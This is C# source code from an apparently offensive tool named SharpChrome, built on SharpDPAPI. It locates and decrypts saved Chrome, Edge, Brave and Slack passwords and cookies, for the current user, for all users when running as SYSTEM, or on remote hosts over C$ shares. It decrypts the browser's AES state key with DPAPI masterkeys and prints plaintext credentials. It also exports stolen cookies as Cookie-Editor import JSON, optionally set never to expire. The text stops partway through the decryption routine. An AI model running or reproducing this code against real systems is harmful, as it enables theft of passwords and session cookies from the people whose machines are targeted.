using System;
using System.Management;
using System.Data;
using System.Security.Cryptography;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using SQLite;
using Microsoft.Win32;

namespace SharpChrome
{
    class Chrome
    {
        internal static byte[] DPAPI_HEADER = UTF8Encoding.UTF8.GetBytes("DPAPI");
        internal static byte[] DPAPI_CHROME_UNKV10 = UTF8Encoding.UTF8.GetBytes("v10");
        internal const int AES_BLOCK_SIZE = 16;

        // approach adapted from @djhohnstein's https://github.com/djhohnstein/SharpChrome/ project
        //  but using this CSHARP-SQLITE version https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp
        public static void TriageChromeLogins(Dictionary<string, string> MasterKeys, string computerName = "", string userFolder = "", string displayFormat = "table", bool showAll = false, bool unprotect = false, string stateKey = "", string browser = "chrome", bool quiet = false)
        {
            // triage all Chromium 'Login Data' files we can reach

            List<string> userDirectories = new List<string>();


            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                if (!SharpDPAPI.Helpers.TestRemote(computerName))
                {
                    return;
                }

                if (!String.IsNullOrEmpty(userFolder))
                {
                    // if we have a user folder as the target to triage
                    userDirectories.Add(userFolder);
                }
                else
                {
                    // Assume C$ (vast majority of cases)
                    string userDirectoryBase = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                    userDirectories.AddRange(Directory.GetDirectories(userDirectoryBase));
                }
            }
            else if (!String.IsNullOrEmpty(userFolder))
            {
                // if we have a user folder as the target to triage
                userDirectories.Add(userFolder);
            }
            else if (SharpDPAPI.Helpers.IsHighIntegrity())
            {
                if ($"{System.Security.Principal.WindowsIdentity.GetCurrent().User}" == "S-1-5-18")
                {
                    // if we're SYSTEM
                    if (MasterKeys.Count > 0)
                    {
                        if (!quiet)
                        {
                            Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n", SharpDPAPI.Helpers.Capitalize(browser));
                        }
                        userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                    }
                    else
                    {
                        if (!quiet)
                        {
                            Console.WriteLine("\r\n[!] Running as SYSTEM but no masterkeys supplied!");
                        }
                        return;
                    }
                }
                else if (MasterKeys.Count == 0)
                {
                    // if we're elevated but not SYSTEM, and no masterkeys are supplied, assume we're triaging just the current user
                    if (!quiet)
                    {
                        Console.WriteLine("\r\n[*] Triaging {0} Logins for current user\r\n", SharpDPAPI.Helpers.Capitalize(browser));
                    }
                    userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    unprotect = true;
                }
                else
                {
                    // otherwise we're elevated and have masterkeys supplied, so assume we're triaging all users
                    if (!quiet)
                    {
                        Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n", SharpDPAPI.Helpers.Capitalize(browser));
                    }
                    userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                }
            }
            else
            {
                // not elevated, no user folder specified, so triage current user
                if (!quiet)
                {
                    Console.WriteLine("\r\n[*] Triaging {0} Logins for current user\r\n", SharpDPAPI.Helpers.Capitalize(browser));
                }
                userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                unprotect = true;
            }


            foreach (string userDirectory in userDirectories)
            {
                var loginDataPath = "";
                var aesStateKeyPath = "";

                if (browser.ToLower() == "chrome")
                {
                    loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", userDirectory);
                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", userDirectory);
                }
                else if (browser.ToLower() == "edge")
                {
                    loginDataPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", userDirectory);
                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", userDirectory);
                }
                else if (browser.ToLower() == "brave")
                {
                    loginDataPath = String.Format("{0}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", userDirectory);
                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State", userDirectory);
                }
                else
                {
                    Console.WriteLine("[X] ERROR: only 'chrome', 'edge', and 'brave' are currently supported for browsers.");
                    return;
                }

                byte[] aesStateKey = null;
                if (!String.IsNullOrEmpty(stateKey))
                {
                    aesStateKey = SharpDPAPI.Helpers.ConvertHexStringToByteArray(stateKey);
                }
                else if (File.Exists(aesStateKeyPath))
                {
                    // try to decrypt the new v80+ AES state file key, if it exists
                    aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, unprotect, quiet);
                }

                ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, unprotect, aesStateKey, quiet);
            }
        }

        public static void TriageChromeCookies(Dictionary<string, string> MasterKeys, string computerName = "", string userFolder = "", string displayFormat = "csv", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "", bool setneverexpire = false, string stateKey = "", string browser = "chrome", bool quiet = false)
        {
            // triage all Chromium 'Login Data' files we can reach

            List<string> userDirectories = new List<string>();


            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                if (!SharpDPAPI.Helpers.TestRemote(computerName))
                {
                    return;
                }

                if (!String.IsNullOrEmpty(userFolder))
                {
                    // if we have a user folder as the target to triage
                    userDirectories.Add(userFolder);
                }
                else
                {
                    // Assume C$ (vast majority of cases)
                    string userDirectoryBase = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                    userDirectories.AddRange(Directory.GetDirectories(userDirectoryBase));
                }
            }
            else if (!String.IsNullOrEmpty(userFolder))
            {
                // if we have a user folder as the target to triage
                userDirectories.Add(userFolder);
            }
            else if (SharpDPAPI.Helpers.IsHighIntegrity())
            {
                if ($"{System.Security.Principal.WindowsIdentity.GetCurrent().User}" == "S-1-5-18")
                {
                    // if we're SYSTEM
                    if (MasterKeys.Count > 0)
                    {
                        if (!quiet)
                        {
                            Console.WriteLine("\r\n[*] Triaging {0} Cookies for ALL users\r\n", SharpDPAPI.Helpers.Capitalize(browser));
                        }
                        userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                    }
                    else
                    {
                        if (!quiet)
                        {
                            Console.WriteLine("\r\n[!] Running as SYSTEM but no masterkeys supplied!");
                        }
                        return;
                    }
                }
                else if (MasterKeys.Count == 0)
                {
                    // if we're elevated but not SYSTEM, and no masterkeys are supplied, assume we're triaging just the current user
                    if (!quiet)
                    {
                        Console.WriteLine("\r\n[*] Triaging {0} Cookies for current user\r\n", SharpDPAPI.Helpers.Capitalize(browser));
                    }
                    userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    unprotect = true;
                }
                else
                {
                    // otherwise we're elevated and have masterkeys supplied, so assume we're triaging all users
                    if (!quiet)
                    {
                        Console.WriteLine("\r\n[*] Triaging {0} Cookies for ALL users\r\n", SharpDPAPI.Helpers.Capitalize(browser));
                    }
                    userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                }
            }
            else
            {
                // not elevated, no user folder specified, so triage current user
                if (!quiet)
                {
                    Console.WriteLine("\r\n[*] Triaging {0} Cookies for current user\r\n", SharpDPAPI.Helpers.Capitalize(browser));
                }
                userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                unprotect = true;
            }


            foreach (string userDirectory in userDirectories)
            {
                var cookiePath = "";
                var aesStateKeyPath = "";

                if (browser.ToLower() == "chrome")
                {
                    cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", userDirectory);
                    if (!File.Exists(cookiePath))
                    {
                        cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", userDirectory);
                    }
                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", userDirectory);
                }
                else if (browser.ToLower() == "edge")
                {
                    cookiePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies", userDirectory);
                    if (!File.Exists(cookiePath))
                    {
                        cookiePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", userDirectory);
                    }
                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", userDirectory);
                }
                else if (browser.ToLower() == "brave")
                {
                    cookiePath = String.Format("{0}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies", userDirectory);
                    if (!File.Exists(cookiePath))
                    {
                        cookiePath = String.Format("{0}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies", userDirectory);
                    }
                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State", userDirectory);
                }
                else if (browser.ToLower() == "slack")
                {
                    cookiePath = String.Format("{0}\\AppData\\Roaming\\Slack\\Network\\Cookies", userDirectory);
                    aesStateKeyPath = String.Format("{0}\\AppData\\Roaming\\Slack\\Local State", userDirectory);
                }
                else
                {
                    Console.WriteLine("[X] ERROR: only 'chrome', 'edge', and 'brave' are currently supported for browsers.");
                    return;
                }

                byte[] aesStateKey = null;
                if (!String.IsNullOrEmpty(stateKey))
                {
                    aesStateKey = SharpDPAPI.Helpers.ConvertHexStringToByteArray(stateKey);
                }
                else if (File.Exists(aesStateKeyPath))
                {
                    // try to decrypt the new v80+ AES state file key, if it exists
                    aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, unprotect, quiet);
                }

                ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire, aesStateKey, quiet);
            }
        }

        public static void TriageStateKeys(Dictionary<string, string> MasterKeys, string computerName = "", bool unprotect = false, string target = "", string userFolder = "")
        {
            List<string> aesKeyPaths = new List<string>();
            // triage all Chromium state keys we can reach

            List<string> userDirectories = new List<string>();

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                if (!SharpDPAPI.Helpers.TestRemote(computerName))
                {
                    return;
                }

                if (!String.IsNullOrEmpty(userFolder))
                {
                    // if we have a user folder as the target to triage
                    userDirectories.Add(userFolder);
                }
                else
                {
                    // Assume C$ (vast majority of cases)
                    string userDirectoryBase = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                    userDirectories.AddRange(Directory.GetDirectories(userDirectoryBase));
                }
            }
            else if (File.Exists(target))
            {
                aesKeyPaths.Add(target);
            }
            else if (!String.IsNullOrEmpty(userFolder))
            {
                // if we have a user folder as the target to triage
                userDirectories.Add(userFolder);
            }
            else if (SharpDPAPI.Helpers.IsHighIntegrity())
            {
                if ($"{System.Security.Principal.WindowsIdentity.GetCurrent().User}" == "S-1-5-18")
                {
                    // if we're SYSTEM
                    if (MasterKeys.Count > 0)
                    {
                        Console.WriteLine("[*] Triaging Chromium state keys for ALL users\r\n");
                        userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                    }
                    else
                    {
                        Console.WriteLine("\r\n[!] Running as SYSTEM but no masterkeys supplied!");
                        return;
                    }
                }
                else if (MasterKeys.Count == 0)
                {
                    // if we're elevated but not SYSTEM, and no masterkeys are supplied, assume we're triaging just the current user
                    Console.WriteLine("[*] Triaging Chromium state keys for current user\r\n");
                    userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    unprotect = true;
                }
                else
                {
                    // otherwise we're elevated and have masterkeys supplied, so assume we're triaging all users
                    Console.WriteLine("[*] Triaging Chromium state keys for ALL users\r\n");
                    userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                }
            }
            else
            {
                // not elevated, no user folder specified, so triage current user
                Console.WriteLine("[*] Triaging Chromium state keys for current user\r\n");
                userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                unprotect = true;
            }


            foreach (string userDirectory in userDirectories)
            {
                aesKeyPaths.Add($"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
                aesKeyPaths.Add($"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State");
                aesKeyPaths.Add($"{userDirectory}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State");
                aesKeyPaths.Add($"{userDirectory}\\AppData\\Roaming\\Slack\\Local State");
            }

            foreach (var aesKeyPath in aesKeyPaths)
            {
                if (File.Exists(aesKeyPath))
                {
                    byte[] aesStateKey = GetStateKey(MasterKeys, aesKeyPath, unprotect, false);
                }
            }
        }

        public static void ParseChromeLogins(Dictionary<string, string> MasterKeys, string loginDataFilePath, string displayFormat = "table", bool showAll = false, bool unprotect = false, byte[] aesStateKey = null, bool quiet = false)
        {
            // takes an individual 'Login Data' file path and performs decryption/triage on it
            if (!File.Exists(loginDataFilePath))
            {
                return;
            }

            BCrypt.SafeAlgorithmHandle hAlg = null;
            BCrypt.SafeKeyHandle hKey = null;

            if (aesStateKey != null)
            {
                // initialize the BCrypt key using the new DPAPI decryption method
                DPAPIChromeAlgKeyFromRaw(aesStateKey, out hAlg, out hKey);
            }

            // convert to a file:/// uri path type so we can do lockless opening
            //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
            var uri = new System.Uri(loginDataFilePath);
            string loginDataFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);

            bool someResults = false;
            SQLiteConnection database = null;

            try
            {
                database = new SQLiteConnection(loginDataFilePathUri, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return;
            }

            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv"))
            {
                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
                return;
            }

            string query = "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins";
            List<SQLiteQueryRow> results = database.Query2(query, false);

            foreach (SQLiteQueryRow row in results)
            {
                byte[] passwordBytes = (byte[])row.column[3].Value;
                byte[] decBytes = null;

                // decrypt the password bytes using masterkeys or CryptUnprotectData()

                if (HasV10Header(passwordBytes))
                {
                    if (aesStateKey != null)
                    {
                        // using the new DPAPI decryption method
                        decBytes = DecryptAESChromeBlob(passwordBytes, hAlg, hKey);

                        if (decBytes == null)
                        {
                            continue;
                        }
                    }
                    else
                    {
                        decBytes = Encoding.ASCII.GetBytes(String.Format("--AES STATE KEY NEEDED--"));
                    }
                }
                else
                {
                    // using the old method
                    decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(passwordBytes, MasterKeys, "chrome", unprotect);
                }

                string password = Encoding.ASCII.GetString(decBytes);

                DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());

                if ((password != String.Empty) || showAll)
                {
                    if (displayFormat.Equals("table"))
                    {
                        if (!someResults)
                        {
                            Console.WriteLine("\r\n--- Credential (Path: {0}) ---\r\n", loginDataFilePath);
                        }
                        someResults = true;
                        Console.WriteLine("URL       : {0} ({1})", row.column[0].Value, row.column[1].Value);
                        Console.WriteLine("Created   : {0}", dateCreated);
                        Console.WriteLine("TimesUsed : {0}", row.column[4].Value);
                        Console.WriteLine("Username  : {0}", row.column[2].Value);
                        Console.WriteLine("Password  : {0}", password);
                        Console.WriteLine();
                    }
                    else
                    {
                        if (!someResults)
                        {
                            if (!quiet)
                            {
                                Console.WriteLine("\r\n---  Credential (Path: {0}) ---\r\n", loginDataFilePath);
                            }
                            else
                            {
                                Console.WriteLine("SEP=,");
                            }
                            Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
                        }
                        someResults = true;

                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}",
                            SharpDPAPI.Helpers.StringToCSVCell(loginDataFilePath),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[0].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[5].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(password));
                    }
                }
            }
            database.Close();
        }

        public static void ParseChromeCookies(Dictionary<string, string> MasterKeys, string cookieFilePath, string displayFormat = "table", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "", bool setneverexpire = false, byte[] aesStateKey = null, bool quiet = false)
        {
            // takes an individual Cookies file path and performs decryption/triage on it

            if (!File.Exists(cookieFilePath))
            {
                return;
            }

            BCrypt.SafeAlgorithmHandle hAlg = null;
            BCrypt.SafeKeyHandle hKey = null;

            if (aesStateKey != null)
            {
                // initialize the BCrypt key using the new DPAPI decryption method
                DPAPIChromeAlgKeyFromRaw(aesStateKey, out hAlg, out hKey);
            }

            // convert to a file:/// uri path type so we can do lockless opening
            //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
            var uri = new System.Uri(cookieFilePath);
            string cookieFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);

            bool someResults = false;
            SQLiteConnection database = null;

            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv") && !displayFormat.Equals("json"))
            {
                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
                return;
            }

            try
            {
                database = new SQLiteConnection(cookieFilePathUri, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return;
            }

            // old - fails in some cases due to partial indexing :(
            //string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, is_secure, is_httponly, cast(last_access_utc as text) as last_access_utc, encrypted_value FROM cookies";

            // new, seems to work with partial indexing?? "/giphy table flip"
            string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, cast(last_access_utc as text) as last_access_utc, encrypted_value, samesite, is_secure, is_httponly FROM cookies";
            List<SQLiteQueryRow> results = database.Query2(query, false);

            // used if cookies "never expire" for json output
            DateTime epoch = new DateTime(1601, 1, 1);
            TimeSpan timespan = (DateTime.Now).AddYears(100) - epoch;
            long longExpiration = (long)Math.Abs(timespan.TotalSeconds * 1000000);

            int idInt = 1;
            foreach (SQLiteQueryRow row in results)
            {
                try
                {
                    byte[] decBytes = null;

                    // decrypt the encrypted cookie value with whatever data/method is specified
                    byte[] valueBytes = (byte[])row.column[6].Value;

                    if (HasV10Header(valueBytes))
                    {
                        if (aesStateKey != null)
                        {
                            // using the new DPAPI decryption method
                            decBytes = DecryptAESChromeBlob(valueBytes, hAlg, hKey);

                            if (decBytes == null)
                            {
                                continue;
                            }
                        }
                        else
                        {
                            decBytes = Encoding.ASCII.GetBytes(String.Format("AES State Key Needed"));
                        }
                    }
                    else
                    {
                        // using the old method
                        decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(valueBytes, MasterKeys, "chrome", unprotect);
                    }

                    string value = Encoding.ASCII.GetString(decBytes);

                    DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[0].Value.ToString());
                    DateTime expires = SharpDPAPI.Helpers.ConvertToDateTime(row.column[4].Value.ToString());

                    double expDateDouble = 0;
                    long expDate;
                    Int64.TryParse(row.column[4].Value.ToString(), out expDate);
                    int sameSite = -1;
                    int.TryParse(row.column[7].Value.ToString(), out sameSite);

                    if (!int.TryParse(row.column[8].Value.ToString(), out int isSecure))
                    {
                        throw new Exception($"Failed to parse int from {row.column[8].Value}");
                    }

                    string secureFlag = isSecure > 0 ? "true" : "false";

                    if (!int.TryParse(row.column[9].Value.ToString(), out int isHttpOnly))
                    {
                        throw new Exception($"Failed to parse int from {row.column[8].Value}");
                    }

                    string httpOnly = isHttpOnly > 0 ? "true" : "false";

                    string sameSiteString = "";
                    switch (sameSite)
                    {
                        case -1:
                            sameSiteString = "unspecified";
                            break;
                        case 0:
                            sameSiteString = "no_restriction";
                            break;
                        case 1:
                            sameSiteString = "lax";
                            break;
                        case 2:
                            sameSiteString = "strict";
                            break;
                        default:
                            throw new Exception($"Unexpected SameSite value {sameSite}");
                    }
                    // https://github.com/djhohnstein/SharpChrome/issues/1
                    if ((expDate / 1000000.000000000000) - 11644473600 > 0)
                        expDateDouble = (expDate / 1000000.000000000000000) - 11644473600;

                    DateTime lastAccess = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());

                    // check conditions that will determine whether we're displaying this cookie entry
                    bool displayValue = false;

                    // if there is a regex
                    if (!String.IsNullOrEmpty(cookieRegex) || !String.IsNullOrEmpty(urlRegex))
                    {
                        // if we're showing all, the cookie isn't expired, or the cookie doesn't have an expiration
                        if (showAll || (expires > DateTime.UtcNow) || (row.column[4].Value.ToString() == "0") || String.IsNullOrEmpty(row.column[4].Value.ToString()))
                        {
                            if (!String.IsNullOrEmpty(cookieRegex))
                            {
                                Match match = Regex.Match(row.column[2].Value.ToString(), cookieRegex, RegexOptions.IgnoreCase);
                                if (match.Success)
                                {
                                    displayValue = true;
                                }
                            }
                            else if (!String.IsNullOrEmpty(urlRegex))
                            {
                                Match match = Regex.Match(row.column[1].Value.ToString(), urlRegex, RegexOptions.IgnoreCase);
                                if (match.Success)
                                {
                                    displayValue = true;
                                }
                            }
                        }
                    }
                    else if (showAll || (expires > DateTime.UtcNow) || (row.column[4].Value.ToString() == "0") || String.IsNullOrEmpty(row.column[4].Value.ToString()))
                    {
                        // if we're showing all, the cookie isn't expired, or the cookie doesn't have an expiration
                        displayValue = true;
                    }

                    if (displayValue)
                    {
                        if (displayFormat.Equals("table"))
                        {
                            if (!someResults)
                            {
                                Console.WriteLine("--- Cookies (Path: {0}) ---\r\n", cookieFilePath);
                            }
                            someResults = true;

                            Console.WriteLine("Host (path)                : {0} ({1})", row.column[1].Value, row.column[3].Value);
                            Console.WriteLine("Cookie Name                : {0}", row.column[2].Value);
                            Console.WriteLine("Cookie Value               : {0}", value);
                            Console.WriteLine("Created/Expires/LastAccess : {0} / {1} / {2}\r\n", dateCreated, expires, lastAccess);
                        }
                        else if (displayFormat.Equals("json"))
                        {
                            if (!someResults)
                            {
                                if (!quiet)
                                {
                                    Console.WriteLine("--- Cookies (Path: {0}) ---\r\n\r\nCookie-Editor import JSON:\r\n\r\n[\r\n{{", cookieFilePath);
                                }
                                else
                                {
                                    Console.WriteLine("[\r\n{");
                                }
                            }
                            else
                            {
                                Console.WriteLine("},\r\n{");
                            }

                            someResults = true;

                            Console.WriteLine("    \"domain\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[1].Value)));
                            if (setneverexpire)
                            {
                                Console.WriteLine("    \"expirationDate\": {0},", longExpiration);
                            }
                            else
                            {
                                if (expDateDouble != 0)
                                {
                                    Console.WriteLine("    \"expirationDate\": {0},", expDateDouble);
                                }
                            }
                            Console.WriteLine($"    \"hostOnly\": false,");
                            Console.WriteLine($"    \"httpOnly\": {httpOnly},");
                            Console.WriteLine("    \"name\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[2].Value)));
                            Console.WriteLine("    \"path\": \"{0}\",", String.Format("{0}", row.column[3].Value));
                            Console.WriteLine($"    \"sameSite\": \"{sameSiteString}\",");
                            Console.WriteLine($"    \"secure\": {secureFlag},");
                            Console.WriteLine("    \"session\": true,");
                            Console.WriteLine("    \"storeId\": \"0\",");
                            Console.WriteLine("    \"value\": \"{0}\"", SharpDPAPI.Helpers.CleanForJSON(value));
                            // Console.WriteLine($"    \"");
                        }
                        else
                        {
                            // csv output
                            if (!someResults)
                            {
                                if (!quiet)
                                {
                                    Console.WriteLine("--- Cookies (Path: {0}) ---\r\n", cookieFilePath);
                                }
                                else
                                {
                                    Console.WriteLine("SEP=,");
                                }
                                Console.WriteLine("file_path,host,path,name,value,creation_utc,expires_utc,last_access_utc");
                            }
                            someResults = true;

                            Console.WriteLine("{0},{1},{2},{3},{4},{5},{6},{7}",
                                    SharpDPAPI.Helpers.StringToCSVCell(cookieFilePath),
                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[3].Value)),
                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
                                    SharpDPAPI.Helpers.StringToCSVCell(value),
                                    SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
                                    SharpDPAPI.Helpers.StringToCSVCell(expires.ToString()),
                                    SharpDPAPI.Helpers.StringToCSVCell(lastAccess.ToString()));
                        }
                    }
                }
                catch { }
            }

            if (displayFormat.Equals("json") && someResults)
            {
                Console.WriteLine("}\r\n]\r\n");
            }

            database.Close();
        }

        // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L322-L344
        public static string GetBase64EncryptedKey(string localStatePath)
        {
            // extracts the base64 encoded encrypted chrome AES state key
            string localStateData = File.ReadAllText(localStatePath);
            string searchTerm = "encrypted_key";

            int startIndex = localStateData.IndexOf(searchTerm);

            if (startIndex < 0)
                return "";

            int keyIndex = startIndex + searchTerm.Length + 3;
            string tempVals = localStateData.Substring(keyIndex);

            int stopIndex = tempVals.IndexOf('"');
            if (stopIndex < 0)
                return "";

            string base64Key = tempVals.Substring(0, stopIndex);

            return base64Key;
        }

        // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L292-L308
        public static byte[] DecryptBase64StateKey(Dictionary<string, string> MasterKeys, string base64Key, bool unprotect)
        {
            byte[] encryptedKeyBytes = System.Convert.FromBase64String(base64Key);

            if ((encryptedKeyBytes == null) || (encryptedKeyBytes.Length == 0))
            {
                return null;
            }

            if (SharpDPAPI.Helpers.ByteArrayEquals(DPAPI_HEADER, 0, encryptedKeyBytes, 0, 5))
            {
                byte[] encryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKeyBytes.Length - 5);

                if (unprotect)
                {
                    byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                    string decKey = BitConverter.ToString(decryptedKey);
                    return decryptedKey;
                }
                else
                {
                    // TODO: masterkey decryption
                    byte[] decryptedKey = SharpDPAPI.Dpapi.DescribeDPAPIBlob(encryptedKey, MasterKeys, "chrome", unprotect);
                    return decryptedKey;
                }
            }
            else
            {
                Console.WriteLine("[X] AES state key has unknown/non-DPAPI encoding.");
            }

            return null;

        }

        public static byte[] GetStateKey(Dictionary<string, string> MasterKeys, string localStatePath, bool unprotect, bool quiet)
        {
            // gets the base64 version of the encrypted state key
            //  and then decrypts it using either masterkeys or DPAPI functions

            try
            {
                string b64StateKey = GetBase64EncryptedKey(localStatePath);
                byte[] stateKey = DecryptBase64StateKey(MasterKeys, b64StateKey, unprotect);

                if (stateKey != null)
                {
                    if (!quiet)
                    {
                        Console.WriteLine("\r\n[*] AES state key file : {0}", localStatePath);
                    }
                    if (stateKey.Length == 32)
                    {
                        if (!quiet)
                        {
                            Console.WriteLine("[*] AES state key      : {0}\r\n", BitConverter.ToString(stateKey).Replace("-", ""));
                        }
                    }
                    else
                    {
                        if (!quiet)
                        {
                            Console.WriteLine("[*] AES state key      : {0}\r\n", Encoding.ASCII.GetString(stateKey));
                        }
                        return null;
                    }
                }

                return stateKey;
            }
            catch (Exception e)
            {
                if (($"{e.Message}".Contains("Key not valid for use in specified state")) && (unprotect))
                {
                    Console.WriteLine($"[X] Error decrypting AES state key '{localStatePath}'\r\n    [*] Likely attempt at using CryptUnprotectData() from invalid user context");
                }
                else
                {
                    Console.WriteLine($"[X] Error decrypting AES state key '{localStatePath}': {e.Message}");
                }

                return null;
            }
        }

        //kuhl_m_dpapi_chrome_alg_key_from_raw
        // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L352-L371
        public static bool DPAPIChromeAlgKeyFromRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg, out BCrypt.SafeKeyHandle hKey)
        {
            bool bRet = false;
            hAlg = null;
            hKey = null;

            uint ntStatus = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (ntStatus == 0)
            {
                ntStatus = BCrypt.BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 0);
                if (ntStatus == 0)
                {
                    ntStatus = BCrypt.BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length, 0);
                    if (ntStatus == 0)
                        bRet = true;
                }
            }
            return bRet;
        }

        // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L136-L197
        // god bless you Dwight for figuring this out lol
        public static byte[] DecryptAESChromeBlob(byte[] dwData, BCrypt.SafeAlgorithmHandle hAlg, BCrypt.SafeKeyHandle hKey)
        {
            // magic decryption happens here

            byte[] dwDataOut = null;
            BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
            int dwDataOutLen;
            IntPtr pData = IntPtr.Zero;
            uint ntStatus;
            byte[] subArrayNoV10;
            int pcbResult = 0;

            unsafe
            {
                if (SharpDPAPI.Helpers.ByteArrayEquals(dwData, 0, DPAPI_CHROME_UNKV10, 0, 3))
                {
